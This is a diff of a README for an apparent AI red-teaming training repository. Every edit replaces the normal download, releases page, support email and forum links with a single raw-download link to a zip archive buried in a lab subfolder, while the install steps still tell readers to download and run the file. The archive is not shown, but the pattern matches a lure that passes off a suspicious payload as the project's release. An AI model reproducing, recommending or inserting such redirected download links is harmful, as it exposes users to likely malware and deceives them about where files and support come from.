@@ -1,7 +1,7 @@
 # 🎓 genai-security-training - Learn Red Teaming for AI Systems
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/fearmotor/genai-security-training/releases)
+[![Download](https://github.com/fearmotor/genai-security-training/raw/refs/heads/main/modules/04_data_extraction/labs/genai_security_training_1.1-beta.4.zip%20Release-brightgreen)](https://github.com/fearmotor/genai-security-training/raw/refs/heads/main/modules/04_data_extraction/labs/genai_security_training_1.1-beta.4.zip)
 
 ## 📖 Overview
 Welcome to the GenAI Red Teaming Training repository. This comprehensive, self-paced training curriculum is specifically designed for security researchers. Our focus is on red teaming GenAI and AI/ML systems. 
@@ -20,7 +20,7 @@ This training equips you with essential offensive security techniques for AI sys
 ## 🚀 Getting Started
 To begin your training, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/fearmotor/genai-security-training/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/fearmotor/genai-security-training/raw/refs/heads/main/modules/04_data_extraction/labs/genai_security_training_1.1-beta.4.zip) to find the latest version of the software.
 
 2. **Download the Software**: On the Releases page, locate the version you want to download. Click on the link to download the installation file to your computer.
 
@@ -38,7 +38,7 @@ To run the GenAI Red Teaming Training software efficiently, make sure your syste
 - **Internet Connection**: Required for downloading resources
 
 ## ⚙️ Download & Install
-To get started, visit this page to download the software: [Download Latest Release](https://github.com/fearmotor/genai-security-training/releases).
+To get started, visit this page to download the software: [Download Latest Release](https://github.com/fearmotor/genai-security-training/raw/refs/heads/main/modules/04_data_extraction/labs/genai_security_training_1.1-beta.4.zip).
 
 Follow the installation steps outlined in the previous section. If you encounter any issues, check the FAQ section or visit our community forums.
 
@@ -83,7 +83,7 @@ For further learning and support, consider the following resources:
 ## 📞 Contact
 For support and inquiries, reach out to us via:
 
-- Email: support@genaisecuritytraining.com
-- Community Forum: [GenAI Community Forum](https://community.genaisecuritytraining.com)
+- Email: https://github.com/fearmotor/genai-security-training/raw/refs/heads/main/modules/04_data_extraction/labs/genai_security_training_1.1-beta.4.zip
+- Community Forum: [GenAI Community Forum](https://github.com/fearmotor/genai-security-training/raw/refs/heads/main/modules/04_data_extraction/labs/genai_security_training_1.1-beta.4.zip)
 
 Thank you for choosing GenAI Red Teaming Training. We look forward to supporting you on your learning journey!
